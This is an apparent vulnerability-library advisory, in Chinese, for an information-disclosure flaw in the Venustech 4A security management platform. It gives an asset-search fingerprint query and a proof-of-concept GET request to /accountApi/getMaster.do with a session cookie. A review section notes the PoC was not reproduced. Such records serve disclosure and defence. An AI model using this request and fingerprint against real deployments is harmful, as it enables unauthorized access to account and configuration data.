---
source: "wy876 漏洞文库"
id: "vw-1d2c3ff78c48ccbbeeb26a40"
entity_id: "ve-1d2c3ff78c48ccbbeeb26a40"
schema_version: "1"
title: "启明星辰4A统一安全管控平台 getMaster.do 信息泄漏"
product: "启明星辰4A统一安全管控平台"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求带sid，角色/版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B04A%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0getMaster.do%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ic9nsb113n14pwvh"
source_status: "recorded"
previous_fofa_unverified: "web.icon=="
hunter: "web.icon==\"fcae06c9415a39c361780b5c0e46ab89\"&&web.title=\"4A\""
---

# 启明星辰4A统一安全管控平台 getMaster.do 信息泄漏

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：启明星辰4A统一安全管控平台
- 本文讨论：accountApi/getMaster.do信息泄露
- 版本、权限与配置前提：请求带sid，角色/版本未知
- 资料类型：信息泄露请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 未给泄露字段/响应，无法区分预期已授权访问与泄露
- HTTP/2文本请求含Connection close；fofa实际Hunter残缺web.icon==
- 安全管控产品应归安全管理软件
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 会话角色、泄露敏感性及版本待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
启明星辰4A统一安全管控平台实现对自然人、资源、资源账号的集中管理，建立“自然人账号-资源-资源账号”对应关系，实现自然人对资源的统一授权，同时，对授权人员的运维操作进行记录、分析、展现，做到作事前规划预防、事中实时监控、违规行为响应、事后合规报告、事故追踪回放，加强内部业务操作行为监管，实现日常运维和业务使用可视、可控、可信，完善安全管理体系。启明星辰4A统一安全管控平台 getMaster.do 存在信息泄漏漏洞。

# 二、影响版本
+ 启明星辰4A统一安全管控平台

# 三、资产测绘
+ hunter`web.icon=="fcae06c9415a39c361780b5c0e46ab89"&&web.title="4A"`


+ 登录页面


# 四、漏洞复现
```http
GET /accountApi/getMaster.do HTTP/2
Host: xx.xx.xx.xx
Cookie: sid=7a5fa1f8-5025-4d3b-9101-26d9db5b2ce0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ic9nsb113n14pwvh>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
